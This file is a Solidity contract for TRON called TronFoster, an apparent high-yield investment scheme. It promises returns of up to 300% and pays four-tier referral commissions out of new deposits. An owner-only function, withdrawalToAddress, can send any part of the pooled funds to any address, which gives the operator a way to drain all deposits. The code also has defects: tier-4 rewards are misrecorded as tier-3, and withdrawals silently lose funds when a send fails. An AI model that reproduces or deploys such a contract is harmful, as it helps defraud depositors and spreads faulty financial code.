//SourceUnit: updatedContract.sol

pragma solidity ^0.4.25;

contract TronFoster{
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint referrals_tier3;
    uint referrals_tier4;
   uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
  
  struct InvestorReferral {
  
    uint referralsAmt_tier1;
    uint referralsAmt_tier2;
    uint referralsAmt_tier3;
    uint referralsAmt_tier4;
    uint balanceRef;
  }
 
    
  uint MIN_DEPOSIT = 5 trx;
  uint START_AT = 22442985;
  
  address public owner = msg.sender;
  
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalWithdrawal;
  uint public totalRefRewards;
  mapping (address => Investor) public investors;
  mapping (address => InvestorReferral) public investorreferrals;
  
  event DepositAt(address user, uint tariff, uint amount);
  event Reinvest(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);
  
  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
      
      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;
        
        address rec = referer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }
          
          if (i == 0) {
            investors[rec].referrals_tier1++;
          }
          if (i == 1) {
            investors[rec].referrals_tier2++;
          }
          if (i == 2) {
            investors[rec].referrals_tier3++;
          }
          if (i == 3) {
            investors[rec].referrals_tier4++;
          }
          
          rec = investors[rec].referer;
        }
      }
    }
  }
  
  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;
    
    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      uint refRewardPercent = 0;
      if(i==0){
          refRewardPercent = 8;
      }
      else if(i==1){
          refRewardPercent = 4;
      }
      else if(i==2){
          refRewardPercent = 2;
      }
      else if(i==3){
           refRewardPercent = 1;
      }
      uint a = amount * refRewardPercent / 100;
      
      if(i==0){
          investorreferrals[rec].referralsAmt_tier1 += a;
      }
      else if(i==1){
          investorreferrals[rec].referralsAmt_tier2 += a;
      }
      else if(i==2){
          investorreferrals[rec].referralsAmt_tier3 += a;
      }
      else if(i==3){
           investorreferrals[rec].referralsAmt_tier3 += a;
      }
      
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      
      rec = investors[rec].referer;
    }
  }
  
  
  constructor() public {
    tariffs.push(Tariff(300 * 28800, 300));
    tariffs.push(Tariff(35 * 28800, 157));
    tariffs.push(Tariff(30 * 28800, 159));
    tariffs.push(Tariff(25 * 28800, 152));
    tariffs.push(Tariff(18 * 28800, 146));
    
    for (uint i = 4; i >= 1; i--) {
      refRewards.push(i);
    }
  }
  
  function deposit(uint tariff, address referer) external payable {
   
    require(msg.value >= MIN_DEPOSIT);
    require(tariff < tariffs.length);
	if(investors[msg.sender].registered){
		require(investors[msg.sender].deposits[0].tariff == tariff);
	}
	
		register(referer);
		
		if(tariff==0){
			 require(msg.value >= 5 trx);
		}
		else if(tariff==1){
			 require(msg.value >= 10 trx);
		}
		else if(tariff==2){
			 require(msg.value >= 50 trx);
		}
		else if(tariff==3){
			 require(msg.value >= 100 trx);
		}
		else if(tariff==4){
			 require(msg.value >= 10000 trx);
		}
	   
	  
	   
		rewardReferers(msg.value, investors[msg.sender].referer);
		
		investors[msg.sender].invested += msg.value;
		totalInvested += msg.value;
		
		investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
		
		emit DepositAt(msg.sender, tariff, msg.value);
	
  }
  
 function reinvest() external  {
    
	uint amount = profit();
    require(amount >= 1 trx);

   
    rewardReferers(amount, investors[msg.sender].referer);
    
    investors[msg.sender].invested += amount;
    totalInvested += amount;
     
	uint tariff = investors[msg.sender].deposits[0].tariff;
	
    investors[msg.sender].deposits.push(Deposit(tariff, amount, block.number));
    investors[msg.sender].withdrawn += amount;
    emit Reinvest(msg.sender,tariff, amount);
  } 
  
  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }
  
    function myTariff() public view returns (uint) {
      
	    uint tariff = investors[msg.sender].deposits[0].tariff;
	    return tariff;
    
    }
   function referralBalance() public view returns (uint) {
    Investor storage investor = investors[msg.sender];
    
	 uint amount = investor.balanceRef;
	 return amount;
    
  }
  
    function myTotalInvestment() public view returns (uint) {
    Investor storage investor = investors[msg.sender];
    
	 uint amount = investor.invested;
	 return amount;
    
  }
  
   function referralLevelBalance() public view returns (uint,uint,uint,uint) {
     InvestorReferral storage investorreferral = investorreferrals[msg.sender];
    
	 uint levelOne = investorreferral.referralsAmt_tier1;
	 uint levelTwo = investorreferral.referralsAmt_tier2;
	 uint levelThree = investorreferral.referralsAmt_tier3;
	 uint levelFour = investorreferral.referralsAmt_tier4;
	 return (levelOne,levelTwo,levelThree,levelFour);
    
    }
    
   function referralLevelCount() public view returns (uint,uint,uint,uint) {
     Investor storage investor = investors[msg.sender];
    
	 uint levelOneCnt = investor.referrals_tier1;
	 uint levelTwoCnt = investor.referrals_tier2;
	 uint levelThreeCnt = investor.referrals_tier3;
	 uint levelFourCnt = investor.referrals_tier4;
	 return (levelOneCnt,levelTwoCnt,levelThreeCnt,levelFourCnt);
    
    }    
  
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = withdrawable(msg.sender);
    
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;
  }
  
  function withdraw() external {
    uint amount = profit();
    if (msg.sender.send(amount)) {
      investors[msg.sender].withdrawn += amount;
      totalWithdrawal +=amount;
      emit Withdraw(msg.sender, amount);
    }
  }
  
  function via(address where) external payable {
    where.transfer(msg.value);
  }
  
  function withdrawalToAddress(address to,uint amount) external {
        require(msg.sender == owner);
        to.transfer(amount);
  }
}